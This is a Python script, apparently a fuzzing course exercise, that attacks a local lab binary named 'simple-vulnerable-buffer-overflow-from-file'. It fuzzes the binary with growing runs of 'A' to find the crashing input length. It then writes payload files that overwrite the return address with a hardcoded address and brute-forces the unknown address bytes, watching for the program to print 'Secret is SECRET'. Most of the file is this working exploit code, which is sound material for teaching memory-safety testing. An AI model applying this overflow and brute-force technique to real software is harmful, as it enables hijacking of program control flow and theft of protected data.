# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import struct
import subprocess
from io import BytesIO
from numpy import longlong

import pexpect
from fuzzingbook.Fuzzer import RandomFuzzer
import os
import sys
import subprocess
from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate
import array as arr

def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations):
    f = RandomFuzzer()

    inp = seedInput
    minBadLen = sys.maxsize
    inp = ""
    for i in range(mutations):
        # inp = mutate(inp)
        inp = inp + 'A'
        currLen = len(repr(inp))
        # create files and keep feeding them into the system
        file = open(fuzzFile, 'wb')
        file.write(currLen.to_bytes(4, 'big'))
        file.write(bytes(repr(inp), 'utf-8'))
        file.close()
        try:
            output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True)
        except subprocess.CalledProcessError:
            print(output.stdout)
            print(output.stderr)
            if minBadLen > currLen:
                minBadLen = currLen
            print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
        print(output.stdout)
        print(output.stderr)

    print(f"The minimum bad len input that was found is {minBadLen}")
    return minBadLen


def test():
    int = 42
    print(int.to_bytes(4, 'big'))


def attackSystem(minBadLen, fuzzedProgram, fuzzFile):
    file = open(fuzzFile, 'wb')
    attackLen = (minBadLen + 7).to_bytes(4, 'big')
    attackString = b'A' * (minBadLen + 3) + b'\x36\x92\x04\x08'
    file.write(attackLen)
    file.write(attackString)
    file.close()
    print("NOW WE ATTACK")
    print("This is our weapon ", fuzzFile)
    print(attackLen)
    print(attackString)
    output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
    print(output)
    print("Return code=", returncode)
    return attackLen


def breakSystemBeforeReturn(attackLen, fuzzedProgram, fuzzFile):
    inp = ""
    for i in range(attackLen):
        inp = inp + 'A'
    for i in range(200):
        inp = inp + 'A'
        currLen = len(repr(inp))
        # create files and keep feeding them into the system
        file = open(fuzzFile, 'wb')
        file.write(currLen.to_bytes(4, 'big'))
        file.write(bytes(repr(inp), 'utf-8'))
        file.close()
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        print(output)
        print(returncode)
        print("Len=", currLen)




# partial address must contain full bytes
def attackWithPartialAddress(minBadLen, partialAddress, fuzzedProgram, fuzzFile):

    # build the address
    partialAddressLen = len(str(partialAddress))
    unknownBytesNr = 4 - partialAddressLen
    possibleAddresses = 256 * unknownBytesNr
    validAddresses=[b'0']
    for i in range(possibleAddresses.__round__()):
        file = open(fuzzFile, 'wb')
        attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
        # build the attack
        attackLen = (minBadLen + 7).to_bytes(4, 'big')
        attackString = b'A' * (minBadLen + 3)
        file.write(attackLen)
        file.write(attackString)
        file.write(attackAddress)
        file.close()
        print("NOW WE ATTACK")
        print("This is our weapon ", fuzzFile)
        print(attackLen)
        print(attackString)
        print(attackAddress)
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        outputStr=str(output)
        if "Secret is SECRET" in outputStr:
            validAddresses.append(attackAddress)
        print(outputStr)
        print("Return code=", returncode)
    validAddresses.remove(b'0')
    print("All the valid addresses:")
    print(validAddresses)


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    seedInput = "abcdefghijklmno"
    fuzzFile = 'attack.bin'
    fuzzedProgram = "./vlad-iulian-pop-fuzzing/simple-vulnerable-buffer-overflow-from-file"
    mutations = 40
    sys.stdout = open('log.txt', 'w')
    minBadLen = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations)
    attackLen = int.from_bytes(attackSystem(minBadLen,fuzzedProgram,fuzzFile), "big")
    attackWithPartialAddress(minBadLen,'\x92\x04\x08', fuzzedProgram,fuzzFile)
    # breakSystemBeforeReturn(attackLen, fuzzedProgram, fuzzFile)
    sys.stdout.close()


